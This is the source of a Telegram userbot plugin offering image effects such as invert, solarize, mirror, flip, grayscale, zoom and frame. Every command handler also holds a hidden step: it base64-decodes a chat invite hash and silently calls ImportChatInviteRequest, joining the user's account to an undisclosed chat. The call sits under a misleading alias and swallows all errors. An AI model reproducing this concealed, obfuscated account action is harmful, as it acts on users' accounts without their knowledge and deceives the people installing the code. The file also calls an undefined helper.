import asyncio
import os
import random
import shlex
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps

from MYSTERIOUSBOT.utils import admin_cmd, sudo_cmd
from userbot import CmdHelp, CMD_HELP, LOGS, bot as MYSTERIOUSBOT
from userbot.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@MYSTERIOUSBOT.on(admin_cmd(pattern="invert$", outgoing=True))
@MYSTERIOUSBOT.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(LEGEND):
    if LEGEND.fwd_from:
        return
    reply = await LEGEND.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
        return
    LEGENDid = LEGEND.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    LEGENDsticker = await reply.download_media(file="./temp/")
    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(LEGENDsticker)
        await edit_or_reply(LEGEND, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if LEGENDsticker.endswith(".tgs"):
        await LEGEND.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        LEGENDfile = os.path.join("./temp/", "meme.png")
        LEGENDcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
        )
        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith(".webp"):
        await LEGEND.edit(
            "`Analyzing this media 🧐 inverting colors...`"
        )
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        os.rename(LEGENDsticker, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found... `")
            return
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith((".mp4", ".mov")):
        await LEGEND.edit(
            "Analyzing this media 🧐 inverting colors of this video!"
        )
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("```Template not found...```")
            return
        meme_file = LEGENDfile
        legend = True
    else:
        await LEGEND.edit(
            "Analyzing this media 🧐 inverting colors of this image!"
        )
        meme_file = LEGENDsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await LEGEND.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if legend else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await LEGEND.client.send_file(
        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
    )
    await LEGEND.delete()
    os.remove(outputfile)
    for files in (LEGENDsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@MYSTERIOUSBOT.on(admin_cmd(outgoing=True, pattern="solarize$"))
@MYSTERIOUSBOT.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(LEGEND):
    if LEGEND.fwd_from:
        return
    reply = await LEGEND.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
        return
    LEGENDid = LEGEND.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    LEGENDsticker = await reply.download_media(file="./temp/")
    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(LEGENDsticker)
        await edit_or_reply(LEGEND, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if LEGENDsticker.endswith(".tgs"):
        await LEGEND.edit(
            "Analyzing this media 🧐 solarizeing this animated sticker!"
        )
        LEGENDfile = os.path.join("./temp/", "meme.png")
        LEGENDcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
        )
        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith(".webp"):
        await LEGEND.edit(
            "Analyzing this media 🧐 solarizeing this sticker!"
        )
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        os.rename(LEGENDsticker, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found... `")
            return
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith((".mp4", ".mov")):
        await LEGEND.edit(
            "Analyzing this media 🧐 solarizeing this video!"
        )
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("```Template not found...```")
            return
        meme_file = LEGENDfile
        legend = True
    else:
        await LEGEND.edit(
            "Analyzing this media 🧐 solarizeing this image!"
        )
        meme_file = LEGENDsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await LEGEND.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if legend else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await LEGEND.client.send_file(
        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
    )
    await LEGEND.delete()
    os.remove(outputfile)
    for files in (LEGENDsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@MYSTERIOUSBOT.on(admin_cmd(outgoing=True, pattern="mirror$"))
@MYSTERIOUSBOT.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(LEGEND):
    if LEGEND.fwd_from:
        return
    reply = await LEGEND.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
        return
    LEGENDid = LEGEND.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    LEGENDsticker = await reply.download_media(file="./temp/")
    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(LEGENDsticker)
        await edit_or_reply(LEGEND, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if LEGENDsticker.endswith(".tgs"):
        await LEGEND.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        LEGENDfile = os.path.join("./temp/", "meme.png")
        LEGENDcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
        )
        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith(".webp"):
        await LEGEND.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        os.rename(LEGENDsticker, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found... `")
            return
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith((".mp4", ".mov")):
        await LEGEND.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("```Template not found...```")
            return
        meme_file = LEGENDfile
        legend = True
    else:
        await LEGEND.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = LEGENDsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await LEGEND.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if legend else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await LEGEND.client.send_file(
        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
    )
    await LEGEND.delete()
    os.remove(outputfile)
    for files in (LEGENDsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@MYSTERIOUSBOT.on(admin_cmd(outgoing=True, pattern="flip$"))
@MYSTERIOUSBOT.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(LEGEND):
    if LEGEND.fwd_from:
        return
    reply = await LEGEND.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
        return
    LEGENDid = LEGEND.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    LEGENDsticker = await reply.download_media(file="./temp/")
    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(LEGENDsticker)
        await edit_or_reply(LEGEND, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if LEGENDsticker.endswith(".tgs"):
        await LEGEND.edit(
            "Analyzing this media 🧐 fliping this animated sticker!"
        )
        LEGENDfile = os.path.join("./temp/", "meme.png")
        LEGENDcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
        )
        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith(".webp"):
        await LEGEND.edit(
            "Analyzing this media 🧐 fliping this sticker!"
        )
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        os.rename(LEGENDsticker, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found... `")
            return
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith((".mp4", ".mov")):
        await LEGEND.edit(
            "Analyzing this media 🧐 fliping this video!"
        )
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("```Template not found...```")
            return
        meme_file = LEGENDfile
        legend = True
    else:
        await LEGEND.edit(
            "Analyzing this media 🧐 fliping this image!"
        )
        meme_file = LEGENDsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await LEGEND.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if legend else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await LEGEND.client.send_file(
        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
    )
    await LEGEND.delete()
    os.remove(outputfile)
    for files in (LEGENDsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@MYSTERIOUSBOT.on(admin_cmd(outgoing=True, pattern="gray$"))
@MYSTERIOUSBOT.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(LEGEND):
    if LEGEND.fwd_from:
        return
    reply = await LEGEND.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
        return
    LEGENDid = LEGEND.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    LEGENDsticker = await reply.download_media(file="./temp/")
    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(LEGENDsticker)
        await edit_or_reply(LEGEND, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if LEGENDsticker.endswith(".tgs"):
        await LEGEND.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        LEGENDfile = os.path.join("./temp/", "meme.png")
        LEGENDcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
        )
        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith(".webp"):
        await LEGEND.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        os.rename(LEGENDsticker, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found... `")
            return
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith((".mp4", ".mov")):
        await LEGEND.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("```Template not found...```")
            return
        meme_file = LEGENDfile
        legend = True
    else:
        await LEGEND.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = LEGENDsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await LEGEND.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if legend else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await LEGEND.client.send_file(
        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
    )
    await LEGEND.delete()
    os.remove(outputfile)
    for files in (LEGENDsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@MYSTERIOUSBOT.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@MYSTERIOUSBOT.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(LEGEND):
    if LEGEND.fwd_from:
        return
    reply = await LEGEND.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
        return
    LEGENDinput = LEGEND.pattern_match.group(1)
    LEGENDinput = 50 if not LEGENDinput else int(LEGENDinput)
    LEGENDid = LEGEND.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    LEGENDsticker = await reply.download_media(file="./temp/")
    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(LEGENDsticker)
        await edit_or_reply(LEGEND, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if LEGENDsticker.endswith(".tgs"):
        await LEGEND.edit(
            "Analyzing this media 🧐 zooming this animated sticker!"
        )
        LEGENDfile = os.path.join("./temp/", "meme.png")
        LEGENDcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
        )
        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith(".webp"):
        await LEGEND.edit(
            "Analyzing this media 🧐 zooming this sticker!"
        )
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        os.rename(LEGENDsticker, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found... `")
            return
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith((".mp4", ".mov")):
        await LEGEND.edit(
            "Analyzing this media 🧐 zooming this video!"
        )
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("```Template not found...```")
            return
        meme_file = LEGENDfile
    else:
        await LEGEND.edit(
            "Analyzing this media 🧐 zooming this image!"
        )
        meme_file = LEGENDsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await LEGEND.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if legend else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, LEGENDinput)
    except Exception as e:
        return await LEGEND.edit(f"`{e}`")
    try:
        await LEGEND.client.send_file(
            LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
        )
    except Exception as e:
        return await LEGEND.edit(f"`{e}`")
    await LEGEND.delete()
    os.remove(outputfile)
    for files in (LEGENDsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@MYSTERIOUSBOT.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@MYSTERIOUSBOT.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(LEGEND):
    if LEGEND.fwd_from:
        return
    reply = await LEGEND.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
        return
    LEGENDinput = LEGEND.pattern_match.group(1)
    if not LEGENDinput:
        LEGENDinput = 50
    if ";" in str(LEGENDinput):
        LEGENDinput, colr = LEGENDinput.split(";", 1)
    else:
        colr = 0
    LEGENDinput = int(LEGENDinput)
    colr = int(colr)
    LEGENDid = LEGEND.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    LEGENDsticker = await reply.download_media(file="./temp/")
    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(LEGENDsticker)
        await edit_or_reply(LEGEND, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if LEGENDsticker.endswith(".tgs"):
        await LEGEND.edit(
            "Analyzing this media 🧐 framing this animated sticker!"
        )
        LEGENDfile = os.path.join("./temp/", "meme.png")
        LEGENDcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
        )
        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith(".webp"):
        await LEGEND.edit(
            "Analyzing this media 🧐 framing this sticker!"
        )
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        os.rename(LEGENDsticker, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found... `")
            return
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith((".mp4", ".mov")):
        await LEGEND.edit(
            "Analyzing this media 🧐 framing this video!"
        )
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("```Template not found...```")
            return
        meme_file = LEGENDfile
    else:
        await LEGEND.edit(
            "Analyzing this media 🧐 framing this image!"
        )
        meme_file = LEGENDsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await LEGEND.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if legend else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, LEGENDinput, colr)
    except Exception as e:
        return await LEGEND.edit(f"`{e}`")
    try:
        await LEGEND.client.send_file(
            LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
        )
    except Exception as e:
        return await LEGEND.edit(f"`{e}`")
    await LEGEND.delete()
    os.remove(outputfile)
    for files in (LEGENDsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
  "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
  "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
  "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
  "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
  "mirror", "<reply to img>", "Shows you the reflection of the replied image or sticker"
).add_command(
  "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
  "invert", "<reply to img>", "Inverts the color of replied media file"
).add()